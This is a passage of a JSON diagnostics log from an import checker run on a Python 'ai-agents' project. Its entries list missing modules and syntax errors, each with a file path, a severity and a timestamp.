        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\master_platform.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.288573"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.463854"
      },
      {
        "category": "IMPORT_ANALYSIS",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\deployment\\secure_deployment.py",
        "issue": "Failed to analyze imports: 'utf-8' codec can't decode byte 0xca in position 8436: invalid continuation byte",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.465979"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "issue": "Module not found: interfaces",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.478276"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "issue": "Module not found: interfaces",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.479138"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "issue": "Module not found: events",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.479979"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "issue": "Module not found: interfaces",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.480812"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "issue": "Module not found: services",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.481717"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.497135"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_phase2.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.506242"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "issue": "Module not found: torch",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.545198"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "issue": "Module not found: torch.nn",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.546148"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "issue": "Module not found: torch.optim",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.546980"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
        "issue": "Module not found: torch",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.557630"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
        "issue": "Module not found: torch.nn",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.558768"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
        "issue": "Module not found: torch.nn.functional",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.559815"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\ppo_agent.py",
        "issue": "Module not found: torch",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.570701"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\ppo_agent.py",
        "issue": "Module not found: torch.nn",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.571747"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\ppo_agent.py",
        "issue": "Module not found: torch.nn.functional",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.572797"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\ppo_agent.py",
        "issue": "Module not found: torch.utils.data",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.573718"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\ppo_agent.py",
        "issue": "Module not found: base_algorithm",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.574614"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\ppo_agent.py",
        "issue": "Module not found: networks",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.575633"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\__init__.py",
        "issue": "Module not found: base_algorithm",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.581395"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\__init__.py",
        "issue": "Module not found: ppo_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.582281"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\__init__.py",
        "issue": "Module not found: sac_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.583353"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\__init__.py",
        "issue": "Module not found: maddpg_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.584658"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\__init__.py",
        "issue": "Module not found: qmix_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.585649"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\__init__.py",
        "issue": "Module not found: replay_buffer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.586592"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\__init__.py",
        "issue": "Module not found: networks",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.587491"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "issue": "Module not found: gymnasium",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.592515"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "issue": "Module not found: gymnasium",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.593468"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\resource_allocation_environment.py",
        "issue": "Module not found: base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.606865"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\supply_chain_environment.py",
        "issue": "Module not found: base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.624315"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "issue": "Module not found: base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.641012"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\__init__.py",
        "issue": "Module not found: trading_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.648664"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\__init__.py",
        "issue": "Module not found: supply_chain_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.649622"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\__init__.py",
        "issue": "Module not found: resource_allocation_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.651228"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\__init__.py",
        "issue": "Module not found: base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.652517"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: torch",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.672860"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: algorithms.base_algorithm",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.673783"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: algorithms.ppo_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.674632"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: environments.base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.675649"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: environments.trading_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.676632"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: environments.supply_chain_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.677468"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: environments.resource_allocation_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.678319"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: curriculum",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.679180"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: environments.base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.695411"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: environments.base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.697085"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: curriculum",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.697967"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "issue": "Module not found: environments.base_environment",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.699633"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\__init__.py",
        "issue": "Module not found: curriculum",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.705664"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\__init__.py",
        "issue": "Module not found: training_pipeline",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.706504"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\__init__.py",
        "issue": "Module not found: experiment_manager",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.707319"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\__init__.py",
        "issue": "Module not found: training_callbacks",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.708138"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\__init__.py",
        "issue": "Module not found: multi_agent_trainer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.708949"
      },
      {
        "category": "SYNTAX",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\comprehensive_demo.py",
        "issue": "Syntax error: unexpected character after line continuation character (<unknown>, line 44)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.723319"
      },
      {
        "category": "SYNTAX",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "issue": "Syntax error: unexpected character after line continuation character (<unknown>, line 172)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.724747"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\__init__.py",
        "issue": "Module not found: dashboard_server",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:33.931660"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\services\\data_service.py",
        "issue": "Module not found: aioredis",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:33.937051"
      },
      {
        "category": "SYNTAX",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "issue": "Syntax error: unexpected indent (<unknown>, line 1517)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:33.985020"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "issue": "Module not found: safety",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:33.996192"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "issue": "Module not found: self_modification",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:33.997093"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "issue": "Module not found: safety",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.038241"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "issue": "Module not found: security",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.039358"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "issue": "Module not found: autonomous.safety",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.041597"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\__init__.py",
        "issue": "Module not found: services",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.050364"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\__init__.py",
        "issue": "Module not found: repositories",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.051212"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\__init__.py",
        "issue": "Module not found: events",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.052072"
      },
      {
        "category": "SYNTAX",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\behavior_analytics.py",
        "issue": "Syntax error: unexpected character after line continuation character (<unknown>, line 138)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.062789"
      },
      {
        "category": "SYNTAX",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\meta_learning.py",
        "issue": "Syntax error: unexpected character after line continuation character (<unknown>, line 178)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.099695"
      },
      {
        "category": "SYNTAX",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\self_improvement.py",
        "issue": "Syntax error: unexpected character after line continuation character (<unknown>, line 177)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.100608"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "issue": "Module not found: master_controller",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.150091"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.154201"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.198486"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "issue": "Module not found: core.autonomous.self_modification",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.228585"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\__init__.py",
        "issue": "Module not found: orchestration",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.236683"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\orchestration\\__init__.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.252175"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Module not found: profiling.cpu_profiler",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.257987"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Module not found: profiling.memory_profiler",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.258885"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Module not found: profiling.performance_dashboard",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.259857"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Module not found: caching.redis_cache",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.260768"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Module not found: optimization.async_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.261603"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Module not found: optimization.algorithm_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.262433"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: profiling.cpu_profiler",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.266553"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: profiling.memory_profiler",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.267358"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: profiling.performance_dashboard",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.268173"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: caching.redis_cache",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.269231"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: caching.memory_cache",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.270490"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: caching.query_cache",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.272148"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: optimization.async_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.273079"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: optimization.algorithm_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.274258"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: optimization.resource_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.275103"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: monitoring.metrics_collector",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.276022"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: monitoring.alerting_system",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.277061"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\__init__.py",
        "issue": "Module not found: monitoring.regression_detector",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.277887"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "issue": "Module not found: causal_inference",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.313369"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "issue": "Module not found: working_memory",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.314225"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "issue": "Module not found: tree_of_thoughts",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.315050"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "issue": "Module not found: temporal_reasoning",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.315868"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "issue": "Module not found: performance.caching.redis_cache",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.330597"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "issue": "Module not found: performance.optimization.async_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.331750"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "issue": "Module not found: performance.optimization.algorithm_optimizer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.332851"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "issue": "Module not found: performance.profiling.cpu_profiler",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.333998"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "issue": "Module not found: performance.profiling.memory_profiler",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.334865"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "issue": "Module not found: statsmodels.tsa.stattools",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.391108"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "issue": "Module not found: working_memory",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.683555"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "issue": "Module not found: working_memory",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.684421"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\__init__.py",
        "issue": "Module not found: services",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.720433"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\__init__.py",
        "issue": "Module not found: events",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.721859"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\autonomous_security.py",
        "issue": "Module not found: autonomous.safety",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.726055"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\autonomous_security.py",
        "issue": "Module not found: resource",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:34.727169"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\code_validation.py",
        "issue": "Module not found: resource",
        "severity": "ERROR",
